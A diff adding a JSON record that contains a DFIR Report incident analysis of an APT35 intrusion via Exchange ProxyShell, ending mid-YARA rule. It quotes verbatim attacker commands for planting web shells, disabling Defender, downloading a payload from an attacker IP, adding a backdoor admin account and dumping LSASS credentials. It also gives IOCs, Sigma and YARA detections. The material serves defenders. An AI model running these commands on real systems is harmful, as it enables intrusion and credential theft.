@@ -1,0 +1,337 @@
+{
+    "id": "c3516cb7-5893-4300-8784-e55108bceb00",
+    "created_at": "2023-01-12T15:10:03.567423Z",
+    "updated_at": "2025-03-27T02:16:11.566832Z",
+    "deleted_at": null,
+    "sha1_hash": "ea52223d1d1f788f7779b5e8bab717f65be06db3",
+    "title": "2022-03-21 - APT35 Automates Initial Access Using ProxyShell",
+    "authors": "",
+    "file_creation_date": "2022-05-28T18:05:13Z",
+    "file_modification_date": "2022-05-28T18:05:13Z",
+    "file_size": 1423047,
+    "plain_text": "# APT35 Automates Initial Access Using ProxyShell\n\n**[thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/](https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/)**\n\nMarch 21, 2022\n\nIn December 2021, we observed an adversary exploiting the Microsoft Exchange ProxyShell\nvulnerabilities to gain initial access and execute code via multiple web shells. The overlap of\nactivities and tasks was remarkably similar to that observed in our previous report,\n[“Exchange Exploit Leads to Domain Wide Ransomware“.](https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/)\n\nIn this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed\nby some further post-exploitation activity, which included web shells, credential dumping, and\n[specialized payloads. We assess that this activity was related to APT35 (TA453, COBALT](https://attack.mitre.org/groups/G0059/)\nILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTP’s mirroring\n[previously reported activity that was attributed to the group.](https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/)\n\n\n-----\n\n## Case Summary\n\nThe threat actors activity occurred in two bursts within a 3 day time frame. As with our\nprevious case, they started by uploading their web shell and disabling antivirus services.\n\nSoon after, they established two persistence methods. The first was through scheduled\ntasks, and the second, was via a newly created account. The account was then added to the\n“remote desktop users” and “local administrators users” groups. Like in the prior case\ninvolving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited\n[similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the](https://github.com/fatedier/frp)\nsame IP as observed in the prior case and connecting to suspect domains.\n\nAfter establishing alternative ways of re-entering the targeted host, they enumerated the\nenvironment using Windows native programs such as net and ipconfig. At the end of their\nfirst visit, they disabled LSA protection, enabled WDigest for access to plain text credentials\nlater, dumped the LSASS process memory, and downloaded the results via the web shell.\n\nAll of this activity occurred over a time frame of around 2 minutes, leading us to assess that\nthe entire attack was likely scripted out. The user agent strings of python-requests/2.26.0\nand python-urllib3/1.26.7 also point to the use of scripts.\n\nTwo days later, we saw the threat actors reappear. We expected them to pick up where they\nleft off, however, they repeated all previous actions. Due to the similarity between the\ncommands and the sequential order they ran, this is additional evidence the threat actors\nemployed automated scripts to execute these activities.\n\nNo further activity was observed as the threat actors were evicted from the network.\n\n### Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and](https://thedfirreport.com/services/)\nControl frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire,\n[PoshC2, etc. More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures,\nfiles, event logs including Sysmon, Kape packages, and more, under our Security\nResearcher and Organization services.\n\n## Timeline\n\n\n-----\n\n[Analysis and reporting completed by @samaritan_o,](https://twitter.com/samaritan_o) [@kostastsale,](https://twitter.com/Kostastsale) [@svch0st and](https://twitter.com/svch0st)\n[@RoxpinTeddy.](https://twitter.com/RoxpinTeddy)\n\n\n-----\n\n## Initial Access\n\nAs similarly seen in our previous report Exchange Exploit Leads to Domain Wide\nRansomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an\nexploit chain of 3 different CVEs:\n\nCVE-2021-34473\nCVE-2021-34523\nCVE-2021-31207\n\n[With the appropriate PowerShell logging available we were able to recover the PowerShell](https://www.mandiant.com/resources/greater-visibilityt)\ncommandlets executed on the Exchange server, which resulted in the creation of web shells\non the host.\n\nOnce the threat actor had gained a valid privileged session using CVE-2021-34473 and\nCVE-2021-34523, they then ensured the default Administrator account had the correct role\nfor mailbox importing and exporting:\n```\nNew-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"[email protected]\n<REDACTED>\"\n\n```\nThe threat actor initiated a mailbox export that matched the search criteria of `Subject -eq`\n```\n'aspx_wkggiyvttmu' to a provided location with the .aspx extension. While the file created\n\n```\nis a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when\nrequested.\n```\nNew-MailboxExportRequest -Mailbox \"[email protected]<REDACTED>\" -FilePath\n\"\\\\localhost\\C$\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\aspx_wkggiyvttmu.aspx\" -IncludeFolders\n(\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_wkggiyvttmu'\"\n\n```\nIn an attempt to hide the actions taken, the actor removes the request just created:\n```\nRemove-MailboxExportRequest -Confirm \"False\" -Force \"True\" -Identity \"77a883a7-470c471c-a193-f4c54f263fde\"\n\n```\nThis activity then repeated approximately 2 days after the initial exploitation. As the actor had\nalready achieved remote execution by this point, there is a high likelihood the exploitation of\nExchange servers is automated. Below is the second web shell created that shares the same\nnaming convention as the first.\n```\nNew-MailboxExportRequest -Mailbox \"[email protected]<REDACTED>\" -FilePath\n\"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\system_web\\aspx_dyukbdcxjfi.aspx\" IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_dyukbdcxjfi'\"\n\n```\n\n-----\n\n## Execution\n\nApproximately 20 seconds after the web shell `aspx_wkggiyvttmu.aspx was created, a`\nflurry of POST requests were sent to the web shell.\n\nThe web shell followed a similar structure seen in previous cases. At least two parameters\nare sent in the POST request to the web shell, `delimiter which defines what string is`\nused to separate the response, and `exec_code which is the command to be ran. The web`\nshell had predefined functions for special actions:\n```\n   get – Get file from location on disk (additional dst POST parameter)\n   put – Upload file to location (additional dst POST parameter)\n   run – Execute a list of commands separated by “;” using PowerShell.\n\n```\n\n-----\n\nIf `exec_code does not start with one of the above commands, it will simply attempt to run it`\nwith PowerShell.\n\nThe environment for this investigation had SSL inspection and PCAPs available for analysis\nwhich allowed us to see the commands being sent to the web shell itself. Below you can see\nan example of commands that were sent and the outputs they returned in the response.\n\nThe actor first uploaded a file `Wininet.xml, which is later used to create a scheduled task,`\nto `C:\\windows\\temp using the` `put command of the web shell. This was followed shortly`\nby several commands to impair Windows Defender before downloading and executing a fake\n```\ndllhost.exe from 148.251.71[.]182.\n\n```\n\n-----\n\nScheduled Task Commands:\n```\nschtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn\n'\\Microsoft\\Windows\\Maintenance\\Wininet'\nschtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n\n```\nDefender Modification Command:\n```\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1\n-AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\nStart-Process powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri\n'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}\n\n```\nThe schedule task runs a batch script called `Wininet.bat which was also uploaded`\nthrough the web shell. `Wininet.bat simply loops through the execution of the file`\n```\ndllhost.exe .\n\n```\nThe file `dllhost.exe is a golang binary. When executed, the binary was observed`\nresolving the following domains:\n\napi.myip[.]com (for discovery)\ntcp443.msupdate[.]us\nkcp53.msupdate[.]us\n\nThe binary also spawns the following commands when executed:\n\ncmd /c wmic computersystem get domain\npowershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;\nGet-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select\nSmtpAddress | ft -hidetableheaders\n\nThe [binary has a low confidence reference to FRP (FastReverseProxy) as the sample](https://www.virustotal.com/gui/file/1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e/community)\nmatches the closed source Yara rule – [HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by](https://valhalla.nextron-systems.com/info/rule/HKTL_PUA_FRP_FastReverseProxy_Oct21_1)\nFlorian Roth) however it does not behave in the same way as the open source tool. This file\nalso matches on an additional Yara rule more recently –\n[APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from](https://valhalla.nextron-systems.com/info/rule/APT_MAL_Go_FRP_CharmingKitten_Jan22_1)\nFRP but otherwise having been modified for use by this threat actor.\n\n\n-----\n\n## Persistence\n\nThe threat actor utilized both account creation and scheduled tasks to gain persistence in the\nenvironment.\n\n**New account creation**\n\nDuring the first activity, we observed the use of `user.exe executable that ran the following`\nPowerShell command:\n```\npowershell.exe /c net user /add DefaultAccount [email protected]; net user\nDefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup\nAdministrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add\nDefaultAccount \n\n```\nThe first thing they did was make a new user named `DefaultAccount with the password`\n```\n[email protected] . They then activated the account and changed the password\n\n```\n[( [email protected] ) for the second time. Finally the commands added the new account](https://thedfirreport.com/cdn-cgi/l/email-protection)\nto the Administrators group and Remote Desktop Users group.\n\nThe threat actors ran the same command again two days later:\n```\npowershell.exe /c net user /add DefaultAccount [email protected]; net user\nDefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup\nAdministrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add\nDefaultAccount\n\n```\nDue to the close proximity between executed commands, we assess that the threat actors\nused tools to automate the execution and discovery phases of this attack.\n\n**Scheduled task**\n\nAs previously noted, we discovered the creation of a Scheduled task from a .xml template\nthat was copied to the server via the web shell.\n\n\n-----\n\nBelow, we can observe the content of wininet.xml:\n\n\n-----\n\nThe following commands where then ran to initiate the task and to achieve persistence:\n```\nschtasks.exe /Create /F /XML %wintmp%\\Wininet.xml /tn\n'\\Microsoft\\Windows\\Maintenance\\Wininet'\nschtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n\n```\n\n-----\n\n## Privilege Escalation\n\nThe scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or\nSYSTEM.\n```\n<UserId>S-1-5-18</UserId>\n\n## Defense Evasion\n\n```\nUsing PowerShell the threat actors issued several commands to impair Windows Defender\nincluding:\n\nWindows Defender Behavior Monitoring was disabled.\nThe Severe Threat default action was set to ‘Allow’.\nRealtime Monitoring was disabled.\nThe ‘C:\\Windows’ path was excluded from scheduled and real-time scanning.\n```\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1\n-AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\n\n```\nA rule was added to the Windows Firewall to allow remote RDP traffic.\n```\n\"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow\nprotocol=TCP localport=3389\n\n```\nRemote Desktop Services was started.\n```\n\"net\" start TermService\n\n```\nThe threat actor enabled WDigest authentication. This enforces the storage of credentials in\nplaintext on future logins.\n```\n\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v\nUseLogonCredential /t REG_DWORD /d 1 /f\n\n```\nLSA protection was disabled.\n```\n\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n\n## Credential Access\n\n```\nThe threat actor created a process memory dump from LSASS.exe. In this case they created\n[a “minidump” using the LOLBIN comsvcs.dll. This was dropped to disk as ssasl.pmd](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)\n(lsass.dmp reversed) and then zipped before exfiltration.\n```\n\"powershell.exe\" /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction\nIgnore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id\nC:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive \nC:\\windows\\temp\\ssasl pmd C:\\windows\\temp\\ssasl zip\n\n```\n\n-----\n\n## Discovery\n\nThe threat actors used native Windows binaries to enumerate the exploited server in an\nautomated fashion. They executed commands such as:\n```\nnet.exe user\nipconfig.exe /all\npowershell.exe (multiple commands)\nquser.exe\n\n```\nThese discovery tasks like the rest of the activity observed from this threat actor was\nexecuted via the web shell.\n\nThey used the PowerShell module Get-WmiObject to collect the name and IP address of the\ndomain controller.\n```\nGet-WMIObject Win32_NTDomain | findstr DomainController\n\n```\nAdditionally, we saw threat actors retrieving an email address from the compromised\nexchange server using the below command. This was likely done as a test.\n```\nAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select\nName -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft hidetableheaders\"\n\n## Collection\n\n```\nWhile having access to the Exchange server, we observed no attempts to export or access\nuser mailboxes\n\n\n-----\n\n## Command and Control\n\nAs we saw from the execution section, dllhost.exe was used to access the below\ndomains for C2, which we believe was using a variation of FRP.\n\ntcp443.msupdate[.]us (107.173.231[.]114)\nkcp53.msupdate[.]us\n(107.173.231[.]114)\n\nThis C2 channel was not used very much as most activity was done through the web shell.\n\n## Exfiltration\n\nThe only successful data that was exfiltrated from the environment was the archive\ncontaining the LSASS dump.\n\nHere you can see the threat actor using the web shell command to extract it:\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were\nevicted. Due to our previous report and OSINT research we believe with medium to high\nconfidence that this intrusion would have ended in ransomware.\n\n\n-----\n\n## Indicators\n\n[All artifacts including web shells, files, IPs, etc. were added to our services in December.](https://thedfirreport.com/services/)\n\n### Network\n```\nipv4:148.251.71[.]182\nipv4:107.173.231[.]114\ndomain: tcp443.msupdate[.]us\ndomain: kcp53.msupdate[.]us\nuseragent:python-urllib3/1.26.7\nuseragent:python-requests/2.26.0\n\n File\naspx_dyukbdcxjfi.aspx\n1a5ad24a6880eea807078375d6461f58\nda2470c3990ea0862a79149c6036388498da83cd\n84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7\ndhvqx.aspx\nb2fde6dc7bd1e04ce601f57805de415b\n4d243969b54b9b80c1d26e0801a6e7e46d2ef03e\nc5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8\ndllhost.exe\n9a3703f9c532ae2ec3025840fa449d4e\n8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee\n1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e\nwininet.bat\n5f098b55f94f5a448ca28904a57c0e58\n27102b416ef5df186bd8b35190c2a4cc4e2fbf37\n668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0\nwininet.xml\nd2f4647a3749d30a35d5a8faff41765e\n0f676bc786db3c44cac4d2d22070fb514b4cb64c\n559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e\nuser.exe\nf0be699c8aafc41b25a8fc0974cc4582\n6bae2d45bbd8c4b0a59ba08892692fe86e596154\n7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\ntask_update.exe\ncacb64bdf648444e66c82f5ce61caf4b\n3a6431169073d61748829c31a9da29123dd61da8\n12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075f\n\n## Detections\n\n```\n\n-----\n\n### Network\n```\nET INFO User-Agent (python-requests) Inbound to Webserver\nET INFO Generic HTTP EXE Upload Inbound\nET INFO Generic HTTP EXE Upload Outbound\nGPL ATTACK_RESPONSE command completed\nET ATTACK_RESPONSE Net User Command Response\nET WEB_SERVER WebShell Generic - netsh firewall\n\n Sigma\n\n```\nCustom rules\n\nExchange Webshell creation – https://github.com/The-DFIR-Report/SigmaRules/blob/main/exchange_webshell_creation\n\nDefaultAccount Usage – https://github.com/The-DFIR-Report/SigmaRules/blob/main/defaultaccount_usage\n\nSigmaHQ rules\n\nLocal Accounts Discovery –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_local_system_owner_account_discovery.yml\n\nLsass Memory Dump via Comsvcs DLL –\nhttps://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rul\nes/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml\n\nNet.exe Execution –\nhttps://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/ru\nles/windows/process_creation/win_susp_net_execution.yml\n\nNet-exe User Account Creation –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_net_user_add.yml\n\nNetsh Port or Application Allowed –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_netsh_fw_add.yml\n\nNetsh RDP Port Opening –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_netsh_allow_port_rdp.yml\n\n\n-----\n\nNon Interactive PowerShell –\nhttps://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rule\ns/windows/process_creation/win_non_interactive_powershell.yml\n\nPowershell Defender Exclusion –\nhttps://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rul\nes/windows/process_creation/win_powershell_defender_exclusion.yml\n\nPowerShell Get-Process LSASS –\nhttps://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rul\nes/windows/process_creation/win_susp_powershell_getprocess_lsass.yml\n\nProcess Dump via Comsvcs DLL –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_susp_comsvcs_procdump.yml\n\nQuick Execution of a Series of Suspicious Commands –\nhttps://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rul\nes/windows/process_creation/win_multiple_suspicious_cli.yml\n\nRare Scheduled Task Creations –\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/\nwindows/other/taskscheduler/win_rare_schtask_creation.yml\n\nService Execution –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_service_execution.yml\n\nShells Spawned by Web Servers –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_webshell_spawn.yml\n\nSuspicious PowerShell Parent Process –\nhttps://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rul\nes/windows/process_creation/win_susp_powershell_parent_process.yml\n\nSuspicious Script Execution From Temp Folder –\nhttps://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rul\nes/windows/process_creation/win_susp_script_exec_from_temp.yml\n\nWdigest Enable UseLogonCredential –\nhttps://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rul\nes/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml\n\n\n-----\n\nWebshell Detection With Command Line Keywords –\nhttps://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rule\ns/windows/process_creation/win_webshell_detection.yml\n\nWindows Defender Real-Time Protection Disabled –\nhttps://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules\n/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml\n\nWindows Defender Threat Detection Disabled –\nhttps://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules\n/windows/registry_event/registry_event_defender_disabled.yml\n\nWindows Shell Spawning Suspicious Program –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/process_creation/win_shell_spawn_susp_program.yml\n\nWindows Suspicious Use Of Web Request in CommandLine –\nhttps://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rule\ns/windows/process_creation/process_creation_susp_web_request_cmd.yml\n\nWindows Webshell Creation –\nhttps://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rul\nes/windows/file_event/sysmon_webshell_creation_detect.yml\n\n### Yara\n\n\n-----\n\n```\nrule files_dhvqx {\n  meta:\n   description = \"9893_files - file dhvqx.aspx\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n   date = \"2022-03-21\"\n   hash1 = \"c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8\"\n  strings:\n   $s1 = \"eval(Request['exec_code'],'unsafe');Response.End;\" fullword ascii\n   $s2 = \"6<script language='JScript' runat='server'>\" fullword ascii\n   $s3 = \"AEALAAAAAAAAAAA\" fullword ascii\n   $s4 = \"AFAVAJA\" fullword ascii\n   $s5 = \"AAAAAAV\" fullword ascii\n   $s6 = \"LAAAAAAA\" fullword ascii\n   $s7 = \"ANAZAQA\" fullword ascii\n   $s8 = \"ALAAAAA\" fullword ascii\n   $s9 = \"AAAAAEA\" ascii\n   $s10 = \"ALAHAUA\" fullword ascii\n  condition:\n   uint16(0) == 0x4221 and filesize < 800KB and\n   ($s1 and $s2) and 4 of them\n}\nrule aspx_dyukbdcxjfi {\n  meta:\n   description = \"9893_files - file aspx_dyukbdcxjfi.aspx\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n   date = \"2022-03-21\"\n   hash1 = \"84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7\"\n  strings:\n   $s1 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] {\n';' }, StringSplitOptions.RemoveEmpty\" ascii\n   $s2 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] {\n';' }, StringSplitOptions.RemoveEmpty\" ascii\n   $s3 = \"var dstFile = Path.Combine(dstDir,\nPath.GetFileName(httpPostedFile.FileName));\" fullword ascii\n   $s4 = \"info.UseShellExecute = false;\" fullword ascii\n   $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword\nascii\n   $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword\nascii\n   $s7 = \"else if (exec_code.StartsWith(\\\"download \\\"))\" fullword ascii\n   $s8 = \"string[] parts = exec_code.Substring(\\\"download \\\".Length).Split(' ');\"\nfullword ascii\n   $s9 = \"Response.AppendHeader(\\\"Content-Disposition\\\", \\\"attachment; filename=\\\"\n+ fileName);\" fullword ascii\n   $s10 = \"result = result + Environment.NewLine + \\\"ERROR:\\\" +\nEnvironment.NewLine + error;\" fullword ascii\n   $s11 = \"else if (exec_code == \\\"get\\\")\" fullword ascii\n   $s12 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n  condition:\n\n```\n\n-----\n\n```\n   uint16(0)  0x4221 and filesize < 800KB and\n   8 of them\n}\nrule files_user {\n  meta:\n   description = \"9893_files - file user.exe\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n   date = \"2022-03-21\"\n   hash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\"\n  strings:\n   $x1 = \"PA<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\n<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVer\" ascii\n   $s2 = \"\\\", or \\\"requireAdministrator\\\" --> <v3:requestedExecutionLevel\nlevel=\\\"requireAdministrator\\\" /> </v3:requestedPrivileges> </v3\" ascii\n   $s3 = \"-InitOnceExecuteOnce\" fullword ascii\n   $s4 = \"0\\\"> <dependency> <dependentAssembly> <assemblyIdentity type=\\\"win32\\\"\nname=\\\"Microsoft.Windows.Common-Controls\\\" version=\\\"6.0.\" ascii\n   $s5 = \"s:v3=\\\"urn:schemas-microsoft-com:asm.v3\\\"> <v3:security>\n<v3:requestedPrivileges> <!-- level can be \\\"asInvoker\\\", \\\"highestAvai\" ascii\n   $s6 = \"PB_GadgetStack_%I64i\" fullword ascii\n   $s7 = \"PB_DropAccept\" fullword ascii\n   $s8 = \"rocessorArchitecture=\\\"*\\\" publicKeyToken=\\\"6595b64144ccf1df\\\"\nlanguage=\\\"*\\\" /> </dependentAssembly> </dependency> <v3:trustInf\" ascii\n   $s9 = \"PB_PostEventMessage\" fullword ascii\n   $s10 = \"PB_WindowID\" fullword ascii\n   $s11 = \"?GetLongPathNameA\" fullword ascii\n   $s12 = \"Memory page error\" fullword ascii\n   $s13 = \"PPPPPPH\" fullword ascii\n   $s14 = \"YZAXAYH\" fullword ascii\n   $s15 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n   $s16 =\n\"NGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPAD\n ascii\n   $s17 = \"PYZAXAYH\" fullword ascii\n   $s18 = \"PB_MDI_Gadget\" fullword ascii\n   $s19 = \"PA<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\n<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVer\" ascii\n   $s20 = \" 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108\nA2DB26CE3BBE7B2CB12F9BEFB37891A3\" fullword wide\n  condition:\n   uint16(0) == 0x5a4d and filesize < 300KB and\n   1 of ($x*) and 4 of them\n}\nrule task_update {\n  meta:\n   description = \"9893_files - file task_update.exe\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n\n```\n\n-----\n\n```\n   date 2022 03 21 \n   hash1 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\"\n  strings:\n   $x1 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly\nxmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii\n   $s2 = \" or \\\"requireAdministrator\\\" --> <v3:requestedExecutionLevel\nlevel=\\\"requireAdministrator\\\" /> </v3:requestedPrivileges> </v3:se\" ascii\n   $s3 = \"-InitOnceExecuteOnce\" fullword ascii\n   $s4 = \"> <dependency> <dependentAssembly> <assemblyIdentity type=\\\"win32\\\"\nname=\\\"Microsoft.Windows.Common-Controls\\\" version=\\\"6.0.0.0\" ascii\n   $s5 = \"v3=\\\"urn:schemas-microsoft-com:asm.v3\\\"> <v3:security>\n<v3:requestedPrivileges> <!-- level can be \\\"asInvoker\\\", \\\"highestAvaila\" ascii\n   $s6 = \"PB_GadgetStack_%I64i\" fullword ascii\n   $s7 = \"PB_DropAccept\" fullword ascii\n   $s8 = \"PB_PostEventMessage\" fullword ascii\n   $s9 = \"PB_WindowID\" fullword ascii\n   $s10 = \"?GetLongPathNameA\" fullword ascii\n   $s11 = \"cessorArchitecture=\\\"*\\\" publicKeyToken=\\\"6595b64144ccf1df\\\"\nlanguage=\\\"*\\\" /> </dependentAssembly> </dependency> <v3:trustInfo \" ascii\n   $s12 = \"Memory page error\" fullword ascii\n   $s13 = \"PPPPPPH\" fullword ascii\n   $s14 = \"YZAXAYH\" fullword ascii\n   $s15 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n   $s16 = \"PYZAXAYH\" fullword ascii\n   $s17 = \"PB_MDI_Gadget\" fullword ascii\n   $s18 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly\nxmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii\n   $s19 = \" 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9\n6104990DFEA3DFAB044FAF960458DB09\" fullword wide\n   $s20 = \"PostEventClass\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 300KB and\n   1 of ($x*) and 4 of them\n}\nrule App_Web_vjloy3pa {\n  meta:\n   description = \"9893_files - file App_Web_vjloy3pa.dll\"\n   author = \"TheDFIRReport\"\n   reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initialaccess-using-proxyshell/\"\n   date = \"2022-03-21\"\n   hash1 = \"faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970\"\n  strings:\n   $x2 = \"hSystem.ComponentModel.DataAnnotations, Version=4.0.0.0,\nCulture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s3 = \"MSystem.Xml, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n   $s4 = \"RSystem.Xml.Linq, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii\n   $s5 = \"ZSystem.ServiceModel.Web, Version=4.0.0.0, Culture=neutral,\nPublicKeyToken=31bf3856ad364e35\" fullword ascii\n   $s6 = \"YSystem.Web.DynamicData, 